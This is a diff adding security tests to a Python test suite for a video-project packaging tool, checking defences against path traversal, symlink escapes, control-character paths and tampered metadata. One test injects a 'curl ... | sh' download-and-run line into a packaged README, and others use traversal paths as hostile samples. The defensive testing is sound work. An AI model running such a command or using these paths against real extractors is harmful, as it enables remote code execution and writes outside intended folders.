@@ -11,6 +11,7 @@ import os
 import struct
 import subprocess
 import sys
+import tempfile
 import zipfile
 
 import pytest
@@ -296,7 +297,7 @@ def test_cli_round_trip(project, tmp_path, capsys):
     assert main(["run", out, "--engine", "py", "--list", "--dir", str(tmp_path / "r")]) == 0
     assert "[render] $" in capsys.readouterr().out
     r = subprocess.run([sys.executable, "-m", "sr_core.vpkg", "--version"], capture_output=True, text=True)
-    assert r.returncode == 0 and "format 1.0" in r.stdout
+    assert r.returncode == 0 and f"format {mf.FORMAT_VERSION}" in r.stdout
 
 
 # ------------------------------------------------------------------------------------------ format versions
@@ -349,3 +350,155 @@ def test_missing_engine_command_explains_the_aliases(tmp_path, monkeypatch):
     lines: list = []
     assert run(str(tmp_path), engine="rs", log=lines.append) == 1
     assert any("scene-render-rs is not on PATH" in ln and "VPKG_ENGINE_RS" in ln and "engines.json" in ln for ln in lines)
+
+
+# ----------------------------------------------------------------------------------------------- safety
+
+def _evil(tmp_path, name: str, files: list, fetch: list | None = None, version: str = "1.1") -> str:
+    """A package whose manifest hashes match its entries, with arbitrary (possibly hostile) paths."""
+    spec = minimal(version, files=[{"path": p, "size": len(d), "sha256": hashlib.sha256(d).hexdigest(),
+                                    "role": "other"} for p, d in files])
+    if fetch:
+        spec["fetch"] = fetch
+    out = tmp_path / name
+    with zipfile.ZipFile(out, "w") as z:
+        z.writestr("vpkg.json", json.dumps(spec))
+        for p, d in files:
+            z.writestr("project/" + p, d)
+    return str(out)
+
+
+def _written(root, name):
+    return [os.path.join(d, f) for d, _, fs in os.walk(root) for f in fs if f == name]
+
+
+def test_verify_and_unpack_never_write_outside(tmp_path, monkeypatch):
+    monkeypatch.setenv("TMPDIR", str(tmp_path / "tmp"))
+    (tmp_path / "tmp").mkdir()
+    tempfile.tempdir = None
+    try:
+        for i, path in enumerate(["../../escape.txt", "a\n/../../../escape.txt"]):
+            pkg = _evil(tmp_path, f"e{i}.vpkg.zip", [(path, b"x")])
+            rep = archive.verify(pkg)
+            assert not rep.ok
+            assert archive.unpack(pkg, str(tmp_path / f"u{i}" / "dest")).errors
+        assert _written(tmp_path, "escape.txt") == []
+    finally:
+        tempfile.tempdir = None
+
+
+def test_relpath_rejects_control_characters_and_hidden_parents():
+    for bad in ["a\n/../../x", "../x", "a/../../x", "/abs", "C:x", "a\\b", "tab\there", "a/\x7f"]:
+        assert mf.schema_errors(minimal(scenes=[{"path": bad, "role": "primary"}])), bad
+    assert mf.schema_errors(minimal(scenes=[{"path": "ok/scene.xml", "role": "primary"}])) == []
+    assert mf.schema_errors(minimal(scenes=[{"path": "trailing.xml\n", "role": "primary"}]))
+
+
+def test_fetch_refuses_paths_outside_the_project(tmp_path):
+    root = tmp_path / "pkg"
+    (root / "project").mkdir(parents=True)
+    spec = minimal(fetch=[{"path": "../outside.bin", "url": "file:///dev/null", "sha256": "0" * 64, "size": 0}])
+    (root / "vpkg.json").write_text(json.dumps(spec))
+    assert archive.fetch_all(str(root), log=lambda *_: None)
+    assert _written(tmp_path, "outside.bin") == []
+
+
+def test_package_metadata_is_hash_checked(project, tmp_path):
+    out, m, _ = _pack(project, tmp_path)
+    assert m["formatVersion"] == mf.FORMAT_VERSION and set(m["packed"]["metaSha256"]) == {"README.md", mf.SCHEMA_NAME}
+    assert archive.verify(out).ok
+    bad = tmp_path / "readme.vpkg.zip"
+    with zipfile.ZipFile(out) as src, zipfile.ZipFile(bad, "w") as dst:
+        for i in src.infolist():
+            data = src.read(i.filename)
+            dst.writestr(i, data + b"\ncurl https://example.invalid/x | sh\n" if i.filename == "README.md" else data)
+    assert any("README.md: SHA-256 differs" in e for e in archive.verify(str(bad)).errors)
+    stripped = tmp_path / "nometa.vpkg.zip"
+    with zipfile.ZipFile(out) as src, zipfile.ZipFile(stripped, "w") as dst:
+        for i in src.infolist():
+            data = src.read(i.filename)
+            if i.filename == "vpkg.json":
+                mm = json.loads(data)
+                del mm["packed"]["metaSha256"]
+                data = json.dumps(mm).encode()
+            dst.writestr(i, data)
+    assert any("metaSha256 is missing" in e for e in archive.verify(str(stripped)).errors)
+
+
+def test_format_1_0_packages_verify_with_a_warning(tmp_path):
+    pkg = _evil(tmp_path, "old.vpkg.zip", [("scene.xml", b"<scene/>")], version="1.0")
+    rep = archive.verify(pkg, deep=False)
+    assert rep.ok, rep.errors
+    assert any("not covered by hashes" in w for w in rep.warnings)
+
+
+def test_pack_refuses_symlinks_that_leave_the_project(project, tmp_path):
+    secret = tmp_path / "secret.txt"
+    secret.write_text("outside")
+    os.symlink(secret, project / "notes.md")
+    with pytest.raises(PackError, match="notes.md: a symbolic link to a file outside the project"):
+        plan(str(project))
+    os.remove(project / "notes.md")
+    os.symlink(secret, project / "renders" / "link.md")          # in an excluded folder: left out, not an error
+    p = plan(str(project))
+    assert ("renders/link.md", "symbolic link outside the project") in p.left_out
+
+
+def test_inside_contains_every_write(tmp_path):
+    root = tmp_path / "root"
+    (root / "sub").mkdir(parents=True)
+    os.symlink(tmp_path, root / "sub" / "up")                     # a link already on disk that leaves the root
+    assert archive.inside(str(root), "sub/file.txt") == str(root / "sub" / "file.txt")
+    for bad in ["../x", "sub/../../x", "sub/up/x", "/etc/x", "a\n/../../x", "a\\b"]:
+        assert archive.inside(str(root), bad) is None, bad
+
+
+def test_render_steps_rerun_when_the_scene_changes(project, tmp_path, capsys):
+    out, _, _ = _pack(project, tmp_path)
+    dest = tmp_path / "u"
+    assert archive.unpack(out, str(dest), fetch=True).ok
+    assert run(str(dest), engine="py", python=sys.executable) == 0
+    capsys.readouterr()
+    assert run(str(dest), engine="py", python=sys.executable) == 0
+    assert "[render] up to date" in capsys.readouterr().out
+    scene = dest / "project" / "scene.xml"
+    later = os.path.getmtime(dest / "project" / "renders" / "out.mp4") + 10
+    os.utime(scene, (later, later))
+    assert run(str(dest), engine="py", python=sys.executable) == 0
+    assert "[render] $" in capsys.readouterr().out
+
+
+def _mini_project(root, scene: str, extra: dict | None = None):
+    root.mkdir(parents=True, exist_ok=True)
+    (root / "scene.xml").write_text(scene)
+    for rel, data in (extra or {}).items():
+        (root / rel).parent.mkdir(parents=True, exist_ok=True)
+        (root / rel).write_bytes(data)
+    (root / "vpkg.json").write_text(mf.dump(minimal("1.1")))
+    return root
+
+
+def test_fonts_anywhere_in_the_project_are_found(tmp_path):
+    proj = _mini_project(tmp_path / "p", '<scene version="1.1"><project width="2" height="2" fps="1" duration="1"/>'
+                         '<styles><textStyle id="t" font="Assets Sans"/></styles><composition>'
+                         '<text id="x" style="t" text="hi"/></composition></scene>',
+                         {"assets/AssetsSans-Regular.ttf": sfnt("Assets Sans")})
+    out, m, _ = pack(str(proj), str(tmp_path / "o.vpkg.zip"), use_system_fonts=False)
+    assert [f["path"] for f in m["fonts"]] == ["assets/AssetsSans-Regular.ttf"]
+    assert archive.verify(out).ok
+
+
+def test_external_references_in_included_documents_are_rewritten(tmp_path):
+    (tmp_path / "shared").mkdir()
+    (tmp_path / "shared" / "b.png").write_bytes(b"png")
+    part = ('<scene version="1.1"><project width="2" height="2" fps="1" duration="1"/><assets>'
+            '<image id="b" src="../../shared/b.png"/></assets><composition/></scene>')
+    proj = _mini_project(tmp_path / "videos" / "p", '<scene version="1.1"><project width="2" height="2" fps="1" '
+                         'duration="1"/><composition><include id="i" src="parts/part.xml"/></composition></scene>',
+                         {"parts/part.xml": part.encode()})
+    (tmp_path / "shared").rename(tmp_path / "videos" / "shared")
+    out, m, _ = pack(str(proj), str(tmp_path / "o.vpkg.zip"))
+    assert archive.verify(out).ok, archive.verify(out).errors
+    with zipfile.ZipFile(out) as z:
+        assert 'src="../_external/shared/b.png"' in z.read("project/parts/part.xml").decode()
+    assert (proj / "parts" / "part.xml").read_text() == part                  # the source is never touched
